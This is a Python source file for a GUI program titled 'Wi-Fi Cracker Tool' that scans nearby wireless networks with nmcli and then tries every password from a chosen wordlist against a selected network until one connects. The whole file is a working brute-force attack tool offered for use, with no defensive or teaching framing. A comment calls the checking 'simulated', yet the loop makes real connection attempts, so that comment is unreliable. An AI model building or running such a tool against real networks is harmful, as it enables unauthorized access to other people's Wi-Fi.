import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox

# Function to scan Wi-Fi networks
def scan_wifi_networks():
    try:
        result = subprocess.run(['nmcli', '-t', '-f', 'SSID,SECURITY', 'dev', 'wifi'], stdout=subprocess.PIPE)
        networks = result.stdout.decode('utf-8').strip().split('\n')
        wifi_list = [network.split(':') for network in networks if network]
        
        # Clear the Listbox before adding new networks
        wifi_listbox.delete(0, tk.END)
        
        for wifi in wifi_list:
            ssid, security = wifi[0], wifi[1]
            wifi_listbox.insert(tk.END, f"SSID: {ssid}, Security: {security}")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}")

# Function to select wordlist file
def select_wordlist():
    wordlist_path = filedialog.askopenfilename(title="Select Wordlist File", filetypes=[("Text Files", "*.txt")])
    wordlist_entry.delete(0, tk.END)
    wordlist_entry.insert(0, wordlist_path)

# Function to brute force Wi-Fi password
def brute_force_wifi():
    selected_network = wifi_listbox.get(tk.ACTIVE)
    ssid = selected_network.split(',')[0].replace("SSID: ", "")
    wordlist_path = wordlist_entry.get()
    
    if not ssid or not wordlist_path:
        messagebox.showwarning("Missing Information", "Please select a network and a wordlist file.")
        return

    try:
        with open(wordlist_path, 'r') as wordlist:
            for password in wordlist:
                password = password.strip()
                # Simulate the checking process (replace with actual checking logic)
                status_label.config(text=f"Trying password: {password}")
                window.update()  # Update the window to reflect the current status
                result = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if b'Error' not in result.stderr:
                    status_label.config(text=f"Password found: {password}")
                    messagebox.showinfo("Success", f"Password found: {password}")
                    break
            else:
                status_label.config(text="Password not found in wordlist.")
                messagebox.showinfo("Failed", "Password not found in the provided wordlist.")
    except FileNotFoundError:
        messagebox.showerror("Error", "Wordlist file not found.")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {e}")

# Setting up the GUI window
window = tk.Tk()
window.title("Wi-Fi Cracker Tool")
window.geometry("500x400")

# Scan Wi-Fi button
scan_button = tk.Button(window, text="Scan Wi-Fi Networks", command=scan_wifi_networks)
scan_button.pack(pady=10)

# Listbox to display Wi-Fi networks
wifi_listbox = tk.Listbox(window, width=50, height=10)
wifi_listbox.pack(pady=10)

# Wordlist file selection
wordlist_frame = tk.Frame(window)
wordlist_frame.pack(pady=10)

wordlist_label = tk.Label(wordlist_frame, text="Wordlist:")
wordlist_label.pack(side=tk.LEFT)

wordlist_entry = tk.Entry(wordlist_frame, width=30)
wordlist_entry.pack(side=tk.LEFT, padx=5)

wordlist_button = tk.Button(wordlist_frame, text="Select Wordlist", command=select_wordlist)
wordlist_button.pack(side=tk.LEFT)

# Brute Force button
brute_force_button = tk.Button(window, text="Start Brute Force Attack", command=brute_force_wifi)
brute_force_button.pack(pady=20)

# Status label
status_label = tk.Label(window, text="Status: Idle")
status_label.pack(pady=10)

# Run the application
window.mainloop()
